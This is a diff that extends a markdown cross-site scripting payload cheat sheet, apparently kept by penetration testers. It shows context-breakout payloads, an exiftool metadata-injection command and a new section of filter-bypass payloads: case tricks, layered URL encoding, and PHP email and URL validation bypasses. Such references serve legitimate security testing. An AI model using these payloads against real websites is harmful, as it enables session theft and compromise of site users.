@@ -37,7 +37,7 @@
 <!-- --><script>alert(1)</script> -->
 ```
 
-4. Add </tag> when the input inside or between opening/closing tags, tag can be <a>,<title,<script> and any other HTML tags
+4. Add </tag> when the input inside or between opening/closing tags, tag can be ```<a>,<title>,<script>``` and any other HTML tags
     
 ```html
 </tag><script>alert(1)</script>
@@ -70,7 +70,7 @@
 <input id="keyword" type="text" name="q" value="" onmouseover=alert(1)">
 ```
 
-6. Use </script> when input inside <script> tags
+6. Use </script> when input inside ```<script>``` tags
 ```html
 </script><script>alert(1)</script>
 ```
@@ -271,4 +271,53 @@ $ exiftool -Artist='"><script>alert(1)</script>' dapos.jpeg
 <a:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</a:script>
 ```
 > Add a "-->" to payload if input lands in a comment section
+
 > Add a "]]>" if input lands in a CDATA section
+
+# XSS Cheat Sheet (Bypass)
+19. Mixed Case
+```html
+<Script>alert(document.cookie)</Script> 
+```
+
+20. Unclosed Tags
+```html
+<svg onload="alert(1)"
+```
+
+21. Uppercase Payloads
+```html
+<SVG ONLOAD=ALERT(1)>
+```
+
+22. Encoded XSS
+```html
+(Encoded)
+%3Csvg%20onload%3Dalert(1)%3E 
+
+(Double Encoded)
+%253Csvg%2520onload%253Dalert%281%29%253E 
+
+(Triple Encoded)
+%25253Csvg%252520onload%25253Dalert%25281%2529%25253E 
+```
+
+23. JS Lowercased Input
+```html
+<SCRİPT>alert(1)</SCRİPT>
+```
+
+24. PHP Email Validation Bypass
+```html
+<svg/onload=alert(1)>"@gmail.com
+```
+
+25. PHP URL Validation Bypass
+```html
+javascript://%250Aalert(1)
+```
+
+26. Inside Comments Bypass
+```html
+<!--><svg onload=alert(1)-->
+```
